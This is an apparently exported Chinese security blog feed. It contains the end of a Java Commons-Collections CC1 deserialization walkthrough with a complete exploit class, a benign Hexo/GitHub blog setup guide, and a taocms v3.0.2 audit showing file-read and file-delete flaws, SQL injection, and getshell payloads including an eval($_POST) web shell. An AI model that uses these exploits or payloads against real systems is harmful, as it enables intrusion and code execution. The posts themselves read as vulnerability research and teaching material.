alt="image-20231010104137177"></p><p>这里有另一个注解Target，点进去看看：</p><p><img src="/2023/04/27/file-upload/20231010104513003.png" alt="image-20231010104513003"></p><p>这里有一个成员变量value，不为空满足条件。因此修改传参为Target.class，并且将put的第一个参数改为value。</p><p><img src="/2023/04/27/file-upload/20231010104935835.png" alt="image-20231010104935835"></p><p>再次debug，看看if判断的情况：</p><p><img src="/2023/04/27/file-upload/20231010105000351.png" alt="image-20231010105000351"></p><p>此时memberType为java.lang.annotation.ElementType。</p><p>继续往下：</p><p><img src="/2023/04/27/file-upload/20231010105250523.png" alt="image-20231010105250523"></p><p>已经成功过了两个if的判断，但是依然无法执行命令。步入继续跟进：</p><p><img src="/2023/04/27/file-upload/20231010105539627.png" alt="image-20231010105539627"></p><p>这里checkSetValue的参数，并不是预期的Runtime runtime，而是AnnotationTypeMismatchExceptionProxy类。</p><p>要解决setValue参数可控的问题，就用到了ConstantTransformer类。</p><p><img src="/2023/04/27/file-upload/20231010110702323.png" alt="image-20231010110702323"></p><p>这里的public构造方法，传入的类都会赋给iConstant，并且在transform方法中，无论传入什么类，都是返回iConstant。</p><p>因此可以利用该特性，将 AnnotationTypeMismatchExceptionProxy 类作为 transform() 方法的参数，也就是Object input，而Object constantToReturn，我们先传入一个 Runtime.class，然后无论 transform() 方法会调用什么对象，都会返回 Runtime.class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231010111514023.png" alt="image-20231010111514023"></p><p>至此成功执行命令。</p><p>总的链子如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">I<span class="hljs-function"><span class="hljs-title">nvokerTransformer</span>-&gt;</span>transform<br>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>-&gt;</span>checkSetValue<br>A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>-&gt;</span>setValue<br>A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>-&gt;</span>readObject<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>CC1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="/2024/07/23/hexo/"/>
    <url>/2024/07/23/hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客"><a href="#hexo-github搭建个人博客" class="headerlink" title="hexo+github搭建个人博客"></a>hexo+github搭建个人博客</h1><h2 id="nodejs，npm安装"><a href="#nodejs，npm安装" class="headerlink" title="nodejs，npm安装"></a>nodejs，npm安装</h2><p>node.js不使用最新版本，而是选择v14.21.3，链接如下：</p><p><a href="https://nodejs.org/zh-cn/download/prebuilt-installer">Node.js — 下载 Node.js® (nodejs.org)</a></p><p>通过msi安装，同时包含了npm 6.14.18.</p><p>安装完成后查看版本：</p><p><img src="/2023/04/27/file-upload/0240723090054454.png" alt="image-20240723090054454"></p><h2 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>安装完成后如下所示：</p><p><img src="/2023/04/27/file-upload/0240723090420627.png" alt="image-20240723090420627"></p><p>下面选择一个目录，创建hexo项目：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">hexo init [<span class="hljs-keyword">project</span>-name]<br>cd [<span class="hljs-keyword">project</span>-name]<br>npm <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723090846584.png" alt="image-20240723090846584"></p><p>本地启动项目：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo <span class="hljs-selector-tag">g</span><br>hexo s<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723090959722.png" alt="image-20240723090959722"></p><h2 id="fluid安装"><a href="#fluid安装" class="headerlink" title="fluid安装"></a>fluid安装</h2><p>主题选择fluid，同样不选用最新版，选择v1.8.13</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/archive/refs/tags/v1.8.13.zip">https://github.com/fluid-dev/hexo-theme-fluid/archive/refs/tags/v1.8.13.zip</a></p><p>下载后解压并重命名为fluid，复制到hexo&#x2F;themes目录下：</p><p><img src="/2023/04/27/file-upload/0240723091251487.png" alt="image-20240723091251487"></p><p>接下来修改根目录下的_config.yml，将theme改为fluid：</p><p><img src="/2023/04/27/file-upload/0240723091448827.png" alt="image-20240723091448827"></p><p>刷新一下，成功：</p><p><img src="/2023/04/27/file-upload/0240723091557550.png" alt="image-20240723091557550"></p><h2 id="具体配置"><a href="#具体配置" class="headerlink" title="具体配置"></a>具体配置</h2><h3 id="创建关于页"><a href="#创建关于页" class="headerlink" title="创建关于页"></a>创建关于页</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> page about<br></code></pre></td></tr></table></figure><p>到source&#x2F;about目录下，修改index.md文件：</p><p><img src="/2023/04/27/file-upload/0240723091730465.png" alt="image-20240723091730465"></p><h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo new post <span class="hljs-selector-attr">[article]</span><br>hexo <span class="hljs-selector-tag">g</span> -d <br>hexo s<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723092431068.png" alt="image-20240723092431068"></p><h3 id="个性化展示"><a href="#个性化展示" class="headerlink" title="个性化展示"></a>个性化展示</h3><h4 id="标签页title："><a href="#标签页title：" class="headerlink" title="标签页title："></a>标签页title：</h4><p>根目录_config.yml-&gt;title</p><p><img src="/2023/04/27/file-upload/0240723092611006.png" alt="image-20240723092611006"></p><h4 id="导航栏左侧标题"><a href="#导航栏左侧标题" class="headerlink" title="导航栏左侧标题"></a>导航栏左侧标题</h4><p>fluid-&gt;_config.yml-&gt;bolg_title</p><p><img src="/2023/04/27/file-upload/0240723092810378.png" alt="image-20240723092810378"></p><h4 id="首页标题"><a href="#首页标题" class="headerlink" title="首页标题"></a>首页标题</h4><p>fluid-&gt;_config.yml-&gt;slogan:text</p><p><img src="/2023/04/27/file-upload/0240723092916902.png" alt="image-20240723092916902"></p><h4 id="阅读量统计"><a href="#阅读量统计" class="headerlink" title="阅读量统计"></a>阅读量统计</h4><p><a href="https://console.leancloud.cn/">https://console.leancloud.cn/</a></p><p>注册账号之后创建开发版本应用，在设置-&gt;应用凭证处获取api信息：</p><p><img src="/2023/04/27/file-upload/0240723093308374.png" alt="image-20240723093308374"></p><p>下面到fluid-&gt;_config.yml文件中修改配置：</p><p><img src="/2023/04/27/file-upload/0240723093419081.png" alt="image-20240723093419081"></p><p>首先将web_analytics项的enable改为true，下面填写api_id，api_key和server_url:</p><p><img src="/2023/04/27/file-upload/0240723093523470.png" alt="image-20240723093523470"></p><p>最后打开浏览计数，将来源改为leancloud：</p><p><img src="/2023/04/27/file-upload/0240723093645078.png" alt="image-20240723093645078"></p><p>至此，已经开启单篇文章阅读量统计，效果如下：</p><p><img src="/2023/04/27/file-upload/0240723093825819.png" alt="image-20240723093825819"></p><p>下面开启整个博客浏览数据统计。</p><p>同样是fluid-&gt;.config.yml:</p><p><img src="/2023/04/27/file-upload/0240723093933391.png" alt="image-20240723093933391"></p><p>效果如下：</p><p><img src="/2023/04/27/file-upload/0240723094142932.png" alt="image-20240723094142932"></p><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><p>修改fluid的配置文件，打开评论插件并选择valine：</p><p><img src="/2023/04/27/file-upload/0240723094450220.png" alt="image-20240723094450220"></p><p>并到下面配置leancloud的api信息：</p><p><img src="/2023/04/27/file-upload/0240723094606481.png" alt="image-20240723094606481"></p><p>效果如下：</p><p><img src="/2023/04/27/file-upload/0240723095857177.png" alt="image-20240723095857177"></p><h2 id="图片加载问题"><a href="#图片加载问题" class="headerlink" title="图片加载问题"></a>图片加载问题</h2><p>hexo配置过程中遇到的最大问题就是图片无法加载，或者根据官方文档能够加载，但是与markdown格式不同，只能在一处正常显示。</p><p>hexo支持的markdown类型图片名为<code>test.jpg</code>，但是在typora中为<code>test/test.jpg</code>，为了解决这一问题，这里使用hexo-renderer-marked插件，踩坑的步骤跳过，直接给出最终的解决方案。</p><p>安装插件：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-renderer-marked <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>修改根目录下的_config.yml:</p><p><img src="/2023/04/27/file-upload/0240723104325771.png" alt="image-20240723104325771"></p><p>修改插件中的js代码，目录为<code>hexo\node_modules\hexo-renderer-marked\lib\renderer.js</code></p><p>搜索image定位到下面的位置，1为原代码，2为修改后的代码：</p><p><img src="/2023/04/27/file-upload/0240723104526181.png" alt="image-20240723104526181"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// findById requires forward slash<br>// <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>* Add the following code <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">***</span><br><span class="hljs-strong">const fixPostPath = join(postPath, &#x27;../&#x27;);</span><br><span class="hljs-strong">const asset = PostAsset.findById(join(fixPostPath, href.replace(/\\/g, &#x27;/&#x27;)));</span><br><span class="hljs-strong">// const asset = PostAsset.findById(join(postPath, href.replace(/\\/g, &#x27;/&#x27;)));</span><br><span class="hljs-strong">// **</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span> End <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>*<br>// asset.path is backward slash in Windows<br></code></pre></td></tr></table></figure><p>最终效果如下。</p><p>在md中，能够正常加载图片，路径为hexo&#x2F;xxx.png:</p><p><img src="/2023/04/27/file-upload/0240723104608472.png" alt="image-20240723104608472"></p><p>hexo中同样正常：</p><p><img src="/2023/04/27/file-upload/0240723104648753.png" alt="image-20240723104648753"></p><h2 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h2><p>安装插件<code>hexo-deployer-git</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>修改根目录配置：</p><p><img src="/2023/04/27/file-upload/0240723110951541.png" alt="image-20240723110951541"></p><p><code>hexo g -d</code>推送即可：</p><p><img src="/2023/04/27/file-upload/0240723111032524.png" alt="image-20240723111032524"></p><p>参考链接：</p><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">GitHub Pages + Hexo搭建个人博客网站，史上最全教程_hexo博客-CSDN博客</a></p><p><a href="https://github.com/hexojs/hexo-renderer-marked/issues/216">md img render part improvement of hexo-render-marked · Issue #216 · hexojs&#x2F;hexo-renderer-marked (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>taocms_v3.0.2</title>
    <link href="/2024/07/23/taocms_v3.0.2/"/>
    <url>/2024/07/23/taocms_v3.0.2/</url>
    
    <content type="html"><![CDATA[<h1 id="taocms-v3-0-2"><a href="#taocms-v3-0-2" class="headerlink" title="taocms_v3.0.2"></a>taocms_v3.0.2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/taogogo/taocms">taogogo&#x2F;taocms: taoCMS is an incredible tiny CMS( Content Management System) , writen in PHP and support MySQL&#x2F;Sqlite as the database(MIT License) (github.com)</a></p><p>win11</p><p>php 5.6.9</p><p>vscode 1.18.1</p><p>mysql 5.5.29</p><p>apache 2.4.39</p><p>访问<code>localhost/install.php</code>，根据提示即可完成安装。</p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>分析一下taocms的路由。</p><p>打开index.php，随便点击功能点：</p><p><img src="/2023/04/27/file-upload/-20230904153245544.png" alt="image-20230904153245544"></p><p>看到api.php，并且有action和ctrl两个参数，查看代码：<br><img src="/2023/04/27/file-upload/-20230904153330218.png" alt="image-20230904153330218"></p><p>包含了config.php和common.php，config.php主要定义了一些参数，看看common.php:</p><p><img src="/2023/04/27/file-upload/-20230904153521430.png" alt="image-20230904153521430"></p><p>这里利用__autoload来进行类加载，并且相关功能代码在include&#x2F;Model目录下。</p><p>回到api.php，对传入的action参数进行首字母大写，并且判断是否在数组(‘Api’,’Comment’)中，如果满足条件，则调用类的相关方法。</p><p>登录后台查看路由。</p><p><img src="/2023/04/27/file-upload/-20230904153823388.png" alt="image-20230904153823388"></p><p>这里需要查看admin.php：</p><p><img src="/2023/04/27/file-upload/-20230904153849178.png" alt="image-20230904153849178"></p><p>可以看到和前台路由类似，不过加上了session进行登录状态的校验。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>这里利用seay进行自动审计，首先看到File.php，可能存在任意文件读取&#x2F;删除漏洞。</p><p><img src="/2023/04/27/file-upload/-20230904154043498.png" alt="image-20230904154043498"></p><p>查看代码：</p><p><img src="/2023/04/27/file-upload/-20230904154202510.png" alt="image-20230904154202510"></p><p>首先是download函数，这里最后对file_get_contents的进行了打印输出，如果参数可控，即可实现任意文件读取。</p><p>这里的参数为readlpath，往上找：</p><p><img src="/2023/04/27/file-upload/-20230904154321840.png" alt="image-20230904154321840"></p><p>realpath即为SYS_ROOT的值拼接上path，path可控，SYS_ROOT的值在config.php中定义：</p><p><img src="/2023/04/27/file-upload/-20230904154419685.png" alt="image-20230904154419685"></p><p>因此，最终变成<code>echo file_get_contents(&#39;D:\phpstudy_pro\WWW\$path&#39;)</code>。</p><p>接下来进行参数的构造，尝试读取index.php。首先action为file，不属于api或者comment，因此为后台操作，url为admin&#x2F;admin.php，ctrl为download，加上path参数，最终：</p><p><img src="/2023/04/27/file-upload/-20230904154711038.png" alt="image-20230904154711038"></p><p>成功读取。</p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>同样在file.php文件中，查看del函数：</p><p><img src="/2023/04/27/file-upload/-20230904160031989.png" alt="image-20230904160031989"></p><p>这里的判断很简单，如果有写权限，并且如果是文件夹，文件夹为空，或者为单独的文件名，即可删除，构造参数进行测试：</p><p><img src="/2023/04/27/file-upload/-20230904160154692.png" alt="image-20230904160154692"></p><p>成功删除文件。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>在del函数中，注意到id：<br><img src="/2023/04/27/file-upload/-20230905135019717.png" alt="image-20230905135019717"></p><p>这里没有进行过滤，直接闭合)即可。</p><p><img src="/2023/04/27/file-upload/-20230905135043139.png" alt="image-20230905135043139"></p><h3 id="修改配置getshell"><a href="#修改配置getshell" class="headerlink" title="修改配置getshell"></a>修改配置getshell</h3><p>接下来登录后台，从功能点入手查看。</p><p><img src="/2023/04/27/file-upload/-20230904171420244.png" alt="image-20230904171420244"></p><p>网站设置处，可以修改各个参数。任意修改一个值，抓包查看：</p><p><img src="/2023/04/27/file-upload/-20230904171641752.png" alt="image-20230904171641752"></p><p>这里action为config，ctrl为update，也就是config.php的update方法：</p><p><img src="/2023/04/27/file-upload/-20230904171955570.png" alt="image-20230904171955570"></p><p>这里将$configData直接写入了根目录下的config.php中，而configData拼接而来，大概如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27; $key&#x27;</span>,  <span class="hljs-string">&#x27;  Base::safeword($configs)&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>key的参数名，主要关注safeword($configs)：</p><p><img src="/2023/04/27/file-upload/-20230904172716747.png" alt="image-20230904172716747"></p><p>这里没有给出level参数，默认为8，走到default判断，如果db为sqlite，就将’改为’’，如果不是sqlite，就进行_addslashs:</p><p><img src="/2023/04/27/file-upload/-20230904172813104.png" alt="image-20230904172813104"></p><p>也就是addslashes函数。</p><p>addslash无法绕过，因此db只能为sqlite，将’改为’’，可以通过<code>\&#39;</code>绕过，加上反斜杠之后，经过处理变成<code>\&#39;&#39;</code>，而因为反斜存在，所以直接闭合。</p><p>payload为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">\&#x27;);<br>@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[123]);//<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/-20230904173211068.png" alt="image-20230904173211068"></p><p><img src="/2023/04/27/file-upload/-20230904173208647.png" alt="image-20230904173208647"></p><h3 id="缓存文件getshell"><a href="#缓存文件getshell" class="headerlink" title="缓存文件getshell"></a>缓存文件getshell</h3><p>照着前面继续搜索file_put_contents，在category中存在如下函数：</p><p><img src="/2023/04/27/file-upload/-20230905100006348.png" alt="image-20230905100006348"></p><p>将arrayData写入data&#x2F;cat_array.inc文件中，而arrayData的值是拼接而且，来源是$o这个变量，跟进到getlist：</p><p><img src="/2023/04/27/file-upload/-20230905100205435.png" alt="image-20230905100205435"></p><p>也就是<code>select * from cms_category where 1=1 order by id desc limit 20;</code></p><p>去数据库中执行该语句：</p><p><img src="/2023/04/27/file-upload/-20230905100306498.png" alt="image-20230905100306498"></p><p>即为后台的管理栏目功能数据：</p><p><img src="/2023/04/27/file-upload/-20230905100437884.png" alt="image-20230905100437884"></p><p>这里不同是后续进行了添加操作。</p><p>也就是说，如果能在后台直接添加数据，将数据插入到数据库中，就能控制变量$o，进而控制arrayData，写入cat_array.inc文件，再找到包含该文件的页面，即可执行命令。</p><p>添加并抓包：</p><p><img src="/2023/04/27/file-upload/-20230905100615479.png" alt="image-20230905100615479"></p><p>根据action和ctrl，找到对应函数：</p><p><img src="/2023/04/27/file-upload/-20230905100652840.png" alt="image-20230905100652840"></p><p>columsdata函数将post值置空：</p><p><img src="/2023/04/27/file-upload/-20230905100822319.png" alt="image-20230905100822319"></p><p>重点是接下来的add_one，该函数用来写入数据。</p><p><img src="/2023/04/27/file-upload/-20230905100852621.png" alt="image-20230905100852621"></p><p>这里直接会走进if循环，并且对输入的值进行safeword的过滤：</p><p><img src="/2023/04/27/file-upload/-20230905101033206.png" alt="image-20230905101033206"></p><p>该函数在前面已经看过，直接进到default，这里的db为mysqli，因此最终利用addslashes函数过滤输入。</p><p>这里payload为：<code>&#39;));phpinfo();/*</code></p><p><img src="/2023/04/27/file-upload/-20230905114528753.png" alt="image-20230905114528753"></p><p>调试结果如图，将拼接后的sql语句echo出来：</p><p><code>INSERT INTO cms_category (name,nickname,fid,cattpl,listtpl,distpl,intro,orders,status) VALUES(&#39;\&#39;));phpinfo();/*&#39;,&#39;123&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;123&#39;,&#39;&#39;,&#39;1&#39;)</code></p><p>插入数据库，写入文件：</p><p><img src="/2023/04/27/file-upload/-20230905132043383.png" alt="image-20230905132043383"></p><p><img src="/2023/04/27/file-upload/-20230905132105280.png" alt="image-20230905132105280"></p><p>index.php引用了该文件，访问：</p><p><img src="/2023/04/27/file-upload/-20230905132127989.png" alt="image-20230905132127989"></p><p>成功。</p><h3 id="后台sql-getshell"><a href="#后台sql-getshell" class="headerlink" title="后台sql getshell"></a>后台sql getshell</h3><p><img src="/2023/04/27/file-upload/-20230905132323381.png" alt="image-20230905132323381"></p><p>后台执行sql功能处，可以直接执行任意sql语句。</p><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>在文件管理处，可以上传文件：</p><p><img src="/2023/04/27/file-upload/-20230905132456042.png" alt="image-20230905132456042"></p><p>抓包查看，找到函数为file.executeupload()。</p><p><img src="/2023/04/27/file-upload/-20230905132758810.png" alt="image-20230905132758810"></p><p>跟进upload，采用白名单校验，无法绕过：</p><p><img src="/2023/04/27/file-upload/-20230905132911892.png" alt="image-20230905132911892"></p><p>但是发现还存在新建文件功能，查看代码无任何过滤：</p><p><img src="/2023/04/27/file-upload/-20230905133030940.png" alt="image-20230905133030940"></p><p>新建123.php，内容为phpinfo，成功：</p><p><img src="/2023/04/27/file-upload/-20230905133135756.png" alt="image-20230905133135756"></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacker101</title>
